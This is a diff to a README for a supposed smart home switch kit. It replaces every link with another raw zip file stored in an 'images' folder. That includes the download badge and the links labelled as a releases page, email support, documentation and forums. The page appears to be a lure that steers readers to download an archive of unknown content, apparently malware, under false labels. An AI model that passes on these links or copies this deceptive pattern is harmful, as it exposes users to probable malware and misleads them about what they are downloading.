@@ -1,6 +1,6 @@
 # 🏡 DIY-Rovad-Smart-Home-Switch-Kit - Simplify Your Smart Home Setup
 
-[![Download](https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/DIY-Rovad-Smart-Home-Switch-Kit_2.1-alpha.1.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/DIY-Rovad-Smart-Home-Switch-Kit_2.1-alpha.1.zip)
+[![Download](https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/Kit_Home_Smart_Switch_DI_Rovad_2.7.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/Kit_Home_Smart_Switch_DI_Rovad_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before you proceed, make sure your system meets the following requirements:
 
 To start using the DIY-Rovad Smart Home Switch Kit, you need to download the software. Follow these simple steps:
 
-1. Visit our [Releases page to download](https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/DIY-Rovad-Smart-Home-Switch-Kit_2.1-alpha.1.zip).
+1. Visit our [Releases page to download](https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/Kit_Home_Smart_Switch_DI_Rovad_2.7.zip).
 2. Locate the latest version of the software.
 3. Click on the download link for your operating system.
 
@@ -67,13 +67,13 @@ If you run into issues, here are some common solutions:
 If you have questions or need help, you can reach us:
 
 - Open an issue on the GitHub page.
-- Email support at https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/DIY-Rovad-Smart-Home-Switch-Kit_2.1-alpha.1.zip
+- Email support at https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/Kit_Home_Smart_Switch_DI_Rovad_2.7.zip
 
 ## 🔗 Additional Resources
 
 For further reading and community support, check out:
 
-- [Official Documentation](https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/DIY-Rovad-Smart-Home-Switch-Kit_2.1-alpha.1.zip)
-- [Community Forums](https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/DIY-Rovad-Smart-Home-Switch-Kit_2.1-alpha.1.zip)
+- [Official Documentation](https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/Kit_Home_Smart_Switch_DI_Rovad_2.7.zip)
+- [Community Forums](https://raw.githubusercontent.com/DaVinci-11/DIY-Rovad-Smart-Home-Switch-Kit/main/images/Kit_Home_Smart_Switch_DI_Rovad_2.7.zip)
 
 Your smart home experience starts here. Enjoy the convenience!
